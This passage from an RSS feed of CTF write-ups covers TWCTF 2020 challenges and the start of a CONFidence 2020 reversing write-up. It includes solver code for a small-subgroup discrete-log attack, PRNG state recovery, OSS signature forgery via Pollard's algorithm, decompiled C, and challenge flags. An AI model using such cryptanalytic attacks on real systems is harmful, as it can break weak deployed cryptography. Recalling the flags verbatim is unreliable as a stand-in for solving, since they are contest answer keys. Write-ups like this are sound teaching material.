&lt;p&gt;Since everything looked pretty legit, we were stuck. Since $p$ is strong, if we write $p := 2q + 1$ then $q$ would be a prime. Alas, the prime is of 1024 bits long. The challenge is very secure, isn&#39;t it?&lt;/p&gt;

&lt;p&gt;Without any clues, we were messing around. Eventually we tried to factorize $p-1$.&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-09-23-twctf/factordb.png&#34;/&gt; 
&lt;/figure&gt;


&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-09-23-twctf/jackie-chan-what.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;&lt;em&gt;Wait what?&lt;/em&gt; Isn&#39;t $p$ a strong prime? Why are there so many factors? Turns out we have messed up the definition of strong prime. A strong prime $p$ is basically a prime with $p-1$ having a large prime factor. The desired $p$ they want should be &lt;em&gt;safe&lt;/em&gt; but not &lt;em&gt;strong&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Okay, back on business. I used $r = 5710354319$ that is a factor of $p-1$. Then the remaining would be easy with discrete logarithm.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# p, q, g, h are redacted to save up some spaces&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;challenge/ciphertext.txt&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(eval, f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)))

r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5710354319&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dlog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bsgs(pow(g, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p), pow(h, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p), p, r)
&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; pow(g, x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; pow(h, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p)

ms &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
m_map &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; m: pow(m, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p), range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)))
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(m_map)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c1, c2 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cs:
    c1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(c1, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p)
    c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(c2, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p)

    m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; c2 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; powmod(c1, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x, p) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; m_map
    ms &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; bytes([m_map&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(m) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;])
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(ms)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;xor-and-shift-encryptor-crypto-303-points&#34;&gt;XOR and shift encryptor (Crypto, 303 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is more like a PPC challenge instead of a cryptography challenge. There is a &lt;code&gt;randgen&lt;/code&gt; function, that serves as the core of the challenge, defined below:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;randgen&lt;/span&gt;():
  &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; s,p
  a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
  b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
  c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;
  s0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s[p]
  p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (p &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
  s1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s[p]
  res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (s0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; s1) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
  s1 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; (s1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; a) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
  s[p] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (s1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; s0 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (s1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (s0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; c))  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; res&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;They are utilizing the &amp;quot;inefficiency&amp;quot; of the above function to encrypt the flag. In particular, they are using the $k_i$-th output to encrypt the $i$-th character of the flag (while $k_i$ could be up to 2&lt;sup&gt;100&lt;/sup&gt;). Of course the naive approach doesn&#39;t work - you will wait forever.&lt;/p&gt;

&lt;p&gt;However, if we are only considering the state transition (i.e., how &lt;code&gt;s&lt;/code&gt; is updated), we can see that it only involves bit shifting and XOR. Let&#39;s define $s_0, s_1, ...$ be a sequence with $s_i^{(k)}$ be the $k$-th bit of $s_i$. Imagine that the initial state being $(s_0, s_1, ..., s_{63})$ and the subsequent states being $(s_{64}, s_1, ..., s_{63})$, $(s_{64}, s_{65}, ..., s_{63})$ and so on.&lt;/p&gt;

&lt;p&gt;We can write transitions under the definition (note that the $+$ operation is actually operated under $\text{GF}(2)$, i.e., it is a XOR):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;$s_{i+64}^{(0)} := s_i^{(0)} + s_i^{(10)} + s_i^{(13)} + s_{i+63}^{(0)} + s_{i+63}^{(37)}$,&lt;/li&gt;
&lt;li&gt;$s_{i+64}^{(1)} := s_i^{(1)} + s_i^{(11)} + s_i^{(14)} + s_{i+63}^{(1)} + s_{i+63}^{(38)}$,&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hence, we can define a $64^2\times64^2$ transition matrix $T$ over $\text{GF}(2)$ from the above definition. Then if we can compute $T^{m}$, we can easily obtain $s_m, s_{m+1}, ..., s_{m+63}$.&lt;/p&gt;

&lt;div class=&#34;alert warning&#34;&gt;
  &lt;strong&gt;Help.&lt;/strong&gt; I personally think it is infeasible to compute the exponentiations since the dimension is large (wouldn&amp;rsquo;t it be $O(m^{2.3737}\cdot\log n)$ to compute $M^n$ for a $m\times m$ matrix?).
&lt;/div&gt;
  

&lt;p&gt;Since we can efficiently compute $s_m$ given an arbitrary $m$, it would be easy for us to skip unecessary states and compute the flag: &lt;code&gt;FAKEFLAG{THIS_IS_FAKE_FLAG}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Oops, nope. I mean&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;TWCTF{1084cd93186a8ab4110c991a7980aae36d77f2_X0R5h1f7+_15_m0Re_c0mp1ex_th4n_y0u_thought_right?1!!}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;circular-crypto-370-points&#34;&gt;circular (Crypto, 370 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;There are two endpoints provided, &lt;code&gt;pubkey&lt;/code&gt; and &lt;code&gt;verify&lt;/code&gt;. The &lt;code&gt;pubkey&lt;/code&gt; endpoint returns a fix &lt;code&gt;n&lt;/code&gt; and &lt;code&gt;k&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://crypto02.chal.ctf.westerns.tokyo/&amp;#34;&lt;/span&gt; -X POST --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;cmd&amp;#34;:&amp;#34;pubkey&amp;#34;}&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# {&amp;#34;pubkey&amp;#34;:{&amp;#34;n&amp;#34;:&amp;#34;25299...&amp;#34;,&amp;#34;k&amp;#34;:&amp;#34;31019...&amp;#34;}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And one can submit &lt;code&gt;x&lt;/code&gt;, &lt;code&gt;y&lt;/code&gt; and &lt;code&gt;msg&lt;/code&gt; to the &lt;code&gt;verify&lt;/code&gt; endpoint. It is verifying a signature in the following way:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[x^2 + ky^2 \equiv \text{hash}(msg)\ (\text{mod}\ n).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;In particular, you can get the flag when the signature is correct and &lt;code&gt;msg == &#39;SUNSHINE RHYTHM&#39;&lt;/code&gt;. Hence, the objective is to solve the quadratic congruence $x^2 + ky^2 \equiv m\ (\text{mod}\ n)$. This is a simplified version of OSS schemes.&lt;/p&gt;

&lt;p&gt;I was not aware of the OSS schemes beforehand. I spent some time deriving the solution by myself but in vain. Eventually, I&#39;ve gave up deriving everything from nothing and came across to Pollard&#39;s algorithm (From &lt;em&gt;An Efficient Solution of the Congruence x&lt;sup&gt;2&lt;/sup&gt; + ky&lt;sup&gt;2&lt;/sup&gt; = m (mod n)&lt;/em&gt; by Pollard and Schnorr). Moreover, the algorithm is described very clearly in &lt;em&gt;An Exposition of Pollard&#39;s Algorithm for Quadratic Congruences&lt;/em&gt; by Shallit. I have an implementation of Pollard&#39;s algorithm following their procedures.&lt;/p&gt;

&lt;p&gt;Supplying $k$, $m$ and $n$ to Pollard&#39;s algorithm, we can get $x$ and $y$ rather quickly. Submitting the values to the &lt;code&gt;verify&lt;/code&gt; endpoint would give us the flag - &lt;code&gt;TWCTF{dbodfs-dbqsjdpso-mjcsb-mfp}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;birds-misc-41-points&#34;&gt;Birds (Misc, 41 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt; and &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Nothing much is given from the challenge description, there are a multiple lines &lt;code&gt;/^[A-Z]{2}[0-9]{3,4}$/&lt;/code&gt;&#39;s.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;BC552
AC849
JL106
PQ448
JL901
LH908
NH2177&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After a bit of Googling, those are flight numbers. What do they mean? Let&#39;s see where they depart and arrive:&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Flight&lt;/th&gt;
&lt;th&gt;Depart from&lt;/th&gt;
&lt;th&gt;Arrive to&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;BC552&lt;/td&gt;
&lt;td&gt;OKA&lt;/td&gt;
&lt;td&gt;NGO&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;AC849&lt;/td&gt;
&lt;td&gt;LHR&lt;/td&gt;
&lt;td&gt;YYZ&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;JL106&lt;/td&gt;
&lt;td&gt;ITM&lt;/td&gt;
&lt;td&gt;HND&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;PQ448&lt;/td&gt;
&lt;td&gt;TBS&lt;/td&gt;
&lt;td&gt;ODS&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;JL901&lt;/td&gt;
&lt;td&gt;HND&lt;/td&gt;
&lt;td&gt;OKA&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;LH908&lt;/td&gt;
&lt;td&gt;FRA&lt;/td&gt;
&lt;td&gt;LHR&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;NH2177&lt;/td&gt;
&lt;td&gt;NRT&lt;/td&gt;
&lt;td&gt;ITM&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Hmm... We can see some locations shown more than once. There must be some meaning. Let&#39;s connect them.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;NRT -&amp;gt; ITM -&amp;gt; HND -&amp;gt; OKA -&amp;gt; NGO
FRA -&amp;gt; LHR -&amp;gt; YYZ
TBS -&amp;gt; ODS&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;By taking the first letter from each of them, we get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;NIHON
FLY
TO&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Oh and finally we have the flag: &lt;code&gt;TWCTF{FLYTONIHON}&lt;/code&gt;. Unfortunately the finals is online this year... (And we are not qualified, too)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Addendum: We did!&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&#34;mask-misc-26-points&#34;&gt;mask (Misc, 26 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt; and &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;There is a list of IP addresses and maybe subnet mask in the challenge description.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;192.168.55.86/255.255.255.0
192.168.80.198/255.255.255.128
192.168.1.228/255.255.255.128
192.168.90.68/255.255.254.0
192.168.8.214/255.255.255.128
...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The list is quite long, we suspect that each IP address is representing a character. After multiple unsuccessful attempts, we found the host identifier for the last row is &lt;code&gt;0b111101&lt;/code&gt;, which is &lt;code&gt;=&lt;/code&gt; in ASCII... Is it encoded with base64?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mask.txt&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; s:
        lr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
        l &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lr[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lr[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
        a&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;chr(int(l[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;int(r[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(a))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The output is: &lt;code&gt;TWCTF{Are-you-using-a-mask?}&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>CONFidence 2020 CTF: Team Trees</title>
      <link>https://b6a.black/posts/2020-09-08-confidencectf-team-trees/</link>
      <pubDate>Tue, 08 Sep 2020 18:30:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-09-08-confidencectf-team-trees/</guid>
      <description>&lt;p&gt;This week, we have teamed up as @blackb6a to play CONFidence 2020 CTF. We end up ranked 15, but we are more proud of ourselves able to solve a reversing challenge called Team Trees (395 points, 5 solves).&lt;/p&gt;

&lt;p&gt;In particular, we are the first-to-solve to the challenge. It took us around two hours to win the flag. This writeup is written by @harrier_lcc and @mystiz613.&lt;/p&gt;

&lt;h2 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;We wanted to plant a lot of trees, but it&#39;s going kinda slow...&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We are given a binary that executes a slow algorithm that takes up a lot of memory. The objective is to wait the program until it is done - the flag would be shown as the output.&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-09-08-confidencectf/i-can-explain.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;Never.&lt;/strong&gt; Our PCs don&#39;t even have enough memory to play with that. Even so, we gotta wait forever for the flag. Our objective is to optimize and rewrite the algorithm used. By optimize we mean reduce &lt;em&gt;both&lt;/em&gt; the time and space complexities.&lt;/p&gt;

&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;

&lt;h3 id=&#34;part-i-baby-steps-from-baby-cases&#34;&gt;Part I: Baby steps from baby cases&lt;/h3&gt;

&lt;p&gt;From the binary, we knew that we are going to find $f(1337)$ for a given $f$. Although we do not know what $f$ is, we could still have an insight on it. For example, we can patch &lt;code&gt;1337&lt;/code&gt; by smaller values: &lt;code&gt;0&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt;, etc.:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;n = 0: p4{32b9b6bca55548ed88ec405c5c7cf3a1}
n = 1: p4{ee5fadd5a727857f32b9b6bca55548ed}
n = 2: p4{ee5fadd5a727857f982d2435efffdac7}
n = 3: p4{c8b5922a9f156985b4f8094372145c13}
...
n = 4: Out of memory ;_;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In particular, &lt;code&gt;32b9b6bca55548ed&lt;/code&gt; in the output for $n = 0$ is the &lt;code&gt;v1&lt;/code&gt; in &lt;code&gt;sub_400816&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_400816&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v0; &lt;span style=&#34;color:#75715e&#34;&gt;// rdx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// rcx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// rt0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x82F96AC97429A68BLL&lt;/span&gt;;
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32B9B6BCA55548EDLL&lt;/span&gt;;
  __debugbreak();
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
  {
    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
    v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
    v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2;
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But what is &lt;code&gt;88ec405c5c7cf3a1&lt;/code&gt;? It must be related to &lt;code&gt;v0&lt;/code&gt; and &lt;code&gt;v1&lt;/code&gt;. We tried &lt;code&gt;3*v0 + 2*v1 + 4&lt;/code&gt; and it is &lt;code&gt;ee5fadd5a727857f&lt;/code&gt;. It does not check out.&lt;/p&gt;

